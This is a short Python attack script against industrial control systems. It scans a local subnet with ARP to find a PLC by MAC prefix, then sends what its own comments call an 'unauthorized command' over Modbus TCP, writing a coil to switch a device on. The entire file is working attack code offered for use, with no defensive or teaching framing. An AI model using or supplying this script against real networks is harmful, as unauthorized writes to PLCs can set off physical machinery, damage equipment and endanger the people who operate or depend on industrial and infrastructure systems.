import sys
from scapy.all import ARP, Ether, srp
from pymodbus.client.sync import ModbusTcpClient

def find_plc_ip():
    # Define the IP range to scan (e.g., 192.168.1.0/24)
    ip_range = "192.168.1.0/24"
    print(f"Scanning network {ip_range} for PLC...")

    # Create an ARP request packet
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send the packet and receive responses
    result = srp(packet, timeout=2, verbose=0)[0]

    # Parse responses to find PLC
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    # Assume the PLC has a specific MAC prefix (e.g., 00:1D:9C)
    plc_ip = None
    for device in devices:
        if device['mac'].startswith("00:1D:9C"):  # Replace with actual PLC MAC prefix
            plc_ip = device['ip']
            print(f"Found PLC at IP: {plc_ip}")
            break
    
    if not plc_ip:
        print("PLC not found on the network.")
        sys.exit(1)
    
    return plc_ip

def send_unauthorized_command(plc_ip):
    # Connect to the PLC using Modbus TCP
    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        print(f"Failed to connect to PLC at {plc_ip}")
        sys.exit(1)
    
    # Send an unauthorized command (e.g., write to a coil)
    try:
        # Example: Write to coil address 0x01 to activate a device
        response = client.write_coil(address=0x01, value=True)
        if response.isError():
            print(f"Error sending command to PLC: {response}")
        else:
            print("Unauthorized command sent successfully.")
    except Exception as e:
        print(f"Exception occurred: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    send_unauthorized_command(plc_ip)